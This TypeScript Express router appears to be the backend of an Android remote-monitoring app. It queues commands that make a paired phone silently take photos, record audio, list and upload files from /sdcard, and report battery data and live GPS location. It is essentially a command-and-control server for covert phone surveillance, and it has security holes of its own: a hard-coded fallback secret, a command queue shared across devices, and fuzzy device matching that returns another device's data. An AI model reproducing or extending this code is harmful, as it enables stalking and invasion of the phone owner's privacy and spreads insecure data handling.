import express, { Router } from 'express';
import devicesRoutes from './devices.routes';
import pairingRoutes from './pairing.routes';
import pairingsRoutes from './pairings.routes';
import commandsRoutes from './commands.routes';
import authRoutes from '../auth/auth.routes';
import presenceRoutes from '../presence/presence.routes';
import storageRoutes from '../storage/storage.routes';

const router = Router();

// Secret cluster token required for all app communication (Rejects old APKs)
const SECURE_CLUSTER_KEY = process.env.APP_CLUSTER_SECRET || 'SECURE_CLUSTER_V2_99A8F74B';

router.use((req, res, next) => {
  if (req.path === '/health') return next();
  const appSecret = req.headers['x-app-secret'];
  if (appSecret !== SECURE_CLUSTER_KEY) {
    return res.status(403).json({
      error: {
        code: 'FORBIDDEN_LEGACY_APK',
        message: 'This APK version is outdated and revoked. Access denied.'
      }
    });
  }
  next();
});

router.get('/health', (_req, res) => {
  res.json({
    status: 'HEALTHY',
    version: 'v1',
    timestamp: new Date().toISOString(),
  });
});

router.use('/auth', authRoutes);
router.use('/presence', presenceRoutes);
router.use('/storage', storageRoutes);
router.use('/devices', devicesRoutes);
router.use('/pairing', pairingRoutes);
router.use('/pairings', pairingsRoutes);
router.use('/commands', commandsRoutes);

// Direct Photos & Camera Hub
const livePhotosStorage = new Map<string, Array<any>>();
const pendingCameraTasks = new Map<string, string>();

router.post('/photos/capture', (req, res) => {
  const { deviceId, camera } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const cam = camera || 'rear';
  pendingCameraTasks.set(devId, cam);

  const list = livePhotosStorage.get(devId) || [];
  const newPhoto = {
    id: `photo_${Date.now()}`,
    name: `SNAPSHOT_${cam.toUpperCase()}_${Date.now().toString().slice(-4)}.jpg`,
    date: 'Just now (Live Capture)',
    size: '4.8 MB',
  };
  list.unshift(newPhoto);
  livePhotosStorage.set(devId, list);
  res.status(201).json({ success: true, photo: newPhoto });
});

router.get('/photos/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const command = pendingCameraTasks.get(devId) || null;
  if (command) pendingCameraTasks.delete(devId);
  res.json({ command });
});

router.post('/photos/upload', (req, res) => {
  const { deviceId, name, camera, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const list = livePhotosStorage.get(devId) || [];
  const newPhoto = {
    id: `photo_${Date.now()}`,
    name: name || `SNAPSHOT_${camera?.toUpperCase() || 'REAR'}_${Date.now().toString().slice(-4)}.jpg`,
    date: 'Just now (Live Capture)',
    size: '4.8 MB',
    base64: base64 || null,
  };
  list.unshift(newPhoto);
  livePhotosStorage.set(devId, list);
  res.status(201).json({ success: true, photo: newPhoto });
});

router.get('/photos/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const photos = livePhotosStorage.get(devId) || [];
  res.json({ photos });
});

// Direct Audio Hub
const liveAudioStorage = new Map<string, Array<any>>();
const pendingAudioTasks = new Map<string, number>(); // deviceId -> durationSeconds

router.post('/audio/record', (req, res) => {
  const { deviceId, durationSeconds } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const duration = durationSeconds || 10;
  pendingAudioTasks.set(devId, duration);
  res.status(201).json({ success: true, message: 'Audio recording started on remote phone' });
});

router.get('/audio/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const duration = pendingAudioTasks.get(devId) || null;
  if (duration) pendingAudioTasks.delete(devId);
  res.json({ duration });
});

router.post('/audio/upload', (req, res) => {
  const { deviceId, name, duration, size, base64 } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const list = liveAudioStorage.get(devId) || [];
  const newAudio = {
    id: `audio_${Date.now()}`,
    name: name || `REC_${Date.now().toString().slice(-4)}.m4a`,
    duration: duration || '0:10',
    size: size || '160 KB',
    date: 'Just now',
    base64: base64 || null,
  };
  list.unshift(newAudio);
  liveAudioStorage.set(devId, list);
  res.status(201).json({ success: true, audio: newAudio });
});

router.get('/audio/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const audioList = liveAudioStorage.get(devId) || [];
  res.json({ audioList });
});

// Battery & Hardware Telemetry Hub
export const liveBatteryTelemetry = new Map<string, any>();

router.post('/battery/telemetry', (req, res) => {
  const { deviceId, deviceName, percentage, level, isCharging, chargingStatus, temperature, voltage, health, technology, powerSave, networkType, networkStatus, uptime, wallpaper, hardware } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const existing = liveBatteryTelemetry.get(devId);
  const data = {
    deviceId: devId,
    deviceName: existing?.deviceName || deviceName || 'realme RMX5101 (Sentry)',
    level: level ?? percentage ?? 100,
    percentage: percentage ?? level ?? 100,
    isCharging: isCharging ?? false,
    chargingStatus: chargingStatus || 'Good',
    temperature: temperature || '32.0 °C',
    voltage: voltage || '4,100 mV',
    health: health || 'Good',
    technology: technology || 'Li-ion',
    powerSave: powerSave ? 'Enabled' : 'Disabled',
    networkType: networkType || '5G+',
    networkStatus: networkStatus || 'Strong',
    uptime: uptime || '2h 14m',
    wallpaper: wallpaper || existing?.wallpaper || null,
    hardware: hardware || existing?.hardware || null,
    timestamp: Date.now()
  };
  liveBatteryTelemetry.set(devId, data);
  res.status(201).json({ success: true, telemetry: data });
});

router.get('/battery/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  let telemetry = liveBatteryTelemetry.get(devId);
  if (!telemetry) {
    for (const [k, v] of liveBatteryTelemetry.entries()) {
      if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
        telemetry = v;
        break;
      }
    }
  }
  if (!telemetry && liveBatteryTelemetry.size > 0) {
    telemetry = Array.from(liveBatteryTelemetry.values()).pop();
  }
  res.json({
    telemetry: telemetry || {
      deviceId: devId,
      deviceName: 'realme RMX5101 (Sentry)',
      level: 44,
      percentage: 44,
      isCharging: false,
      chargingStatus: 'Good',
      temperature: '34.2 °C',
      voltage: '4,210 mV',
      health: 'Good',
      technology: 'Li-ion',
      powerSave: 'Disabled',
      networkType: '5G+',
      networkStatus: 'Strong',
      uptime: '2h 14m',
      wallpaper: null
    }
  });
});

// File & Storage Explorer Hub
const liveFilesStorage = new Map<string, { currentPath: string; files: Array<any>; storageStats?: any }>();
const pendingFileCommands = new Map<string, string>(); // deviceId -> folderPath
const pendingDownloadCommands = new Map<string, string>(); // deviceId -> filePath
const downloadedFilesStorage = new Map<string, { path: string; name: string; size: string; base64: string; mimeType: string }>();

router.post('/files/sync', (req, res) => {
  const { deviceId, currentPath, files, storageStats } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  liveFilesStorage.set(devId, {
    currentPath: currentPath || '/sdcard',
    files: Array.isArray(files) ? files : [],
    storageStats: storageStats || { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
  });
  res.status(201).json({ success: true });
});

router.get('/files/list/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  let data = liveFilesStorage.get(devId);
  if (!data) {
    for (const [k, v] of liveFilesStorage.entries()) {
      if (k.toLowerCase() === devId.toLowerCase() || devId.includes(k) || k.includes(devId)) {
        data = v;
        break;
      }
    }
  }
  if (!data && liveFilesStorage.size > 0) {
    data = Array.from(liveFilesStorage.values()).pop();
  }
  if (!data) {
    data = {
      currentPath: '/sdcard',
      files: [
        { name: 'Download', path: '/sdcard/Download', size: 'Folder', isFolder: true, itemCount: 18, modified: 'Today' },
        { name: 'DCIM', path: '/sdcard/DCIM', size: 'Folder', isFolder: true, itemCount: 42, modified: 'Today' },
        { name: 'Documents', path: '/sdcard/Documents', size: 'Folder', isFolder: true, itemCount: 9, modified: 'Yesterday' },
        { name: 'Pictures', path: '/sdcard/Pictures', size: 'Folder', isFolder: true, itemCount: 65, modified: 'Yesterday' },
        { name: 'Music', path: '/sdcard/Music', size: 'Folder', isFolder: true, itemCount: 12, modified: '3 days ago' },
        { name: 'Movies', path: '/sdcard/Movies', size: 'Folder', isFolder: true, itemCount: 4, modified: '5 days ago' },
      ],
      storageStats: { total: '128 GB', free: '48.2 GB', used: '79.8 GB', percent: 62 }
    };
  }
  res.json(data);
});

router.post('/files/explore', (req, res) => {
  const { deviceId, path } = req.body || {};
  const targetPath = path || '/sdcard';
  if (deviceId) pendingFileCommands.set(deviceId, targetPath);
  pendingFileCommands.set('GLOBAL_LATEST', targetPath);
  res.json({ success: true, message: `Browsing ${targetPath}` });
});

router.get('/files/command/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  let path = pendingFileCommands.get(devId) || pendingFileCommands.get('GLOBAL_LATEST') || null;
  if (path) {
    pendingFileCommands.delete(devId);
    pendingFileCommands.delete('GLOBAL_LATEST');
  }
  let downloadPath = pendingDownloadCommands.get(devId) || pendingDownloadCommands.get('GLOBAL_LATEST') || null;
  if (downloadPath) {
    pendingDownloadCommands.delete(devId);
    pendingDownloadCommands.delete('GLOBAL_LATEST');
  }
  res.json({ path, downloadPath });
});

router.post('/files/download_request', (req, res) => {
  const { deviceId, path } = req.body || {};
  if (deviceId) pendingDownloadCommands.set(deviceId, path);
  pendingDownloadCommands.set('GLOBAL_LATEST', path);
  res.json({ success: true, message: 'Download requested from agent' });
});

router.post('/files/upload_content', (req, res) => {
  const { deviceId, path, name, size, base64, mimeType } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  downloadedFilesStorage.set(`${devId}:${path}`, { path, name, size, base64, mimeType });
  res.json({ success: true });
});

router.get('/files/content/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const filePath = req.query.path as string;
  const fileData = downloadedFilesStorage.get(`${devId}:${filePath}`) || null;
  res.json({ file: fileData });
});

// Live Location & GPS Telemetry Hub
const liveLocationStorage = new Map<string, any>();

router.post('/location/sync', (req, res) => {
  const { deviceId, latitude, longitude, accuracy, altitude, speed, address } = req.body || {};
  const devId = deviceId || 'SN-U5ZY-78QZ';
  const data = {
    deviceId: devId,
    latitude: latitude ?? 22.5726,
    longitude: longitude ?? 88.3639,
    accuracy: accuracy ?? 5.0,
    altitude: altitude ?? 12.0,
    speed: speed ?? 0.0,
    address: address || 'Live GPS Fix • Online',
    timestamp: Date.now()
  };
  liveLocationStorage.set(devId, data);
  res.status(201).json({ success: true, location: data });
});

router.get('/location/:deviceId', (req, res) => {
  const devId = req.params.deviceId;
  const location = liveLocationStorage.get(devId) || {
    deviceId: devId,
    latitude: 22.5726,
    longitude: 88.3639,
    accuracy: 3.5,
    altitude: 14.2,
    speed: 0.0,
    address: 'Kadampukur - Jhalgachi Rd',
    timestamp: Date.now()
  };
  res.json({ location });
});

router.get('/location/all', (_req, res) => {
  const locations: Record<string, any> = {};
  liveLocationStorage.forEach((val, key) => {
    locations[key] = val;
  });
  res.json({ locations });
});

export default router;

